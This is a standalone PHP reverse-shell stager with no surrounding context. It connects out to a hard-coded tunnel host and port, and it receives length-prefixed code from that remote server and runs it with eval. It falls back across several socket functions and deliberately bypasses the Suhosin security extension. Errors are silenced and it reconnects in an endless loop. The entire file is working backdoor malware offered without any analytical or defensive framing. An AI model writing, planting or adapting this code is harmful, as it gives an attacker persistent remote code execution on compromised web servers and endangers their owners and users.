<?php
error_reporting(0);

$ip = 'synnaulaid-39785.portmap.host';
$port = 39785;

while (true) {
    $s = null;
    $s_type = null;

    if (($f = 'stream_socket_client') && is_callable($f)) {
        $s = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
    }
    
    if (!$s && ($f = 'fsockopen') && is_callable($f)) {
        $s = $f($ip, $port);
        $s_type = 'stream';
    }
    
    if (!$s && ($f = 'socket_create') && is_callable($f)) {
        $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            sleep(5); // Delay before retrying
            continue;
        }
        $s_type = 'socket';
    }
    
    if (!$s_type) {
        die('no socket funcs');
    }
    
    if (!$s) {
        die('no socket');
    }

    // Handle data transfer based on socket type
    switch ($s_type) {
        case 'stream':
            $len = fread($s, 4);
            break;
        case 'socket':
            $len = socket_read($s, 4);
            break;
    }

    if (!$len) {
        sleep(5); // Delay before retrying
        continue;
    }

    $a = unpack("Nlen", $len);
    $len = $a['len'];
    $b = '';
    
    while (strlen($b) < $len) {
        switch ($s_type) {
            case 'stream':
                $b .= fread($s, $len - strlen($b));
                break;
            case 'socket':
                $b .= socket_read($s, $len - strlen($b));
                break;
        }
    }
    
    $GLOBALS['msgsock'] = $s;
    $GLOBALS['msgsock_type'] = $s_type;

    // Bypass Suhosin if it's enabled
    if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) {
        $suhosin_bypass = create_function('', $b);
        $suhosin_bypass();
    } else {
        eval($b);
    }

    // Close connection and sleep for a short period before retrying
    if ($s_type == 'stream') {
        fclose($s);
    } elseif ($s_type == 'socket') {
        socket_close($s);
    }

    sleep(1); // Delay before retrying connection
}
?>
